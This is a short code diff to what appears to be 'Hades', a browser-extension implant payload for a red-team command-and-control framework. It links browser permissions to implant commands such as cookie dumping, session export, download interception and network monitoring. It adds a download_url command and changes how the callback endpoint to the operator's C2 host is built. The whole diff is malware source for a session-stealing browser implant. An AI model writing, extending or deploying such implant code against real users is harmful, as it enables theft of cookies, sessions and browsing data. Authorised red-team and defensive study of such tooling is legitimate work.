@@ -278,7 +278,7 @@ _CONTENT_SCRIPT_CMDS = {
 _CORE_PERMISSIONS = {"tabs", "storage", "activeTab", "scripting", "alarms"}
 
 _CMD_PERMISSIONS = {
-    "cookies":        {"dump_cookies", "session_export"},
+    "cookies":        {"dump_cookies", "session_export", "download_url"},
     "identity":       {"sysinfo"},
     "history":        {"history"},
     "bookmarks":      {"bookmarks"},
@@ -288,6 +288,7 @@ _CMD_PERMISSIONS = {
     "downloads":      {"download_history", "download_watch", "download_watch_stop",
                        "download_intercept_start", "download_intercept_stop"},
     "webRequest":     {"network_monitor_start", "network_monitor_stop"},
+    "declarativeNetRequestWithHostAccess": {"download_url"},
     "notifications":  {"notifications"},
     # nativeMessaging required for all native host commands
     "nativeMessaging": {"native_start", "native_stop",
@@ -498,7 +499,10 @@ class Hades(PayloadType):
                 params   = c2.parameters or {}
                 host     = str(params.get("callback_host", "")).rstrip("/")
                 port     = str(params.get("callback_port", "80")).strip()
-                endpoint = str(params.get("ENDPOINT_REPLACE", "")).strip().lstrip("/")
+                # websocket: ENDPOINT_REPLACE; http profile: post_uri (Hades always POSTs)
+                endpoint = str(
+                    params.get("ENDPOINT_REPLACE") or params.get("post_uri") or ""
+                ).strip().lstrip("/")
                 path     = "/" + endpoint if endpoint else "/"
 
                 # Detect EKE (RSA key exchange) vs PSK mode
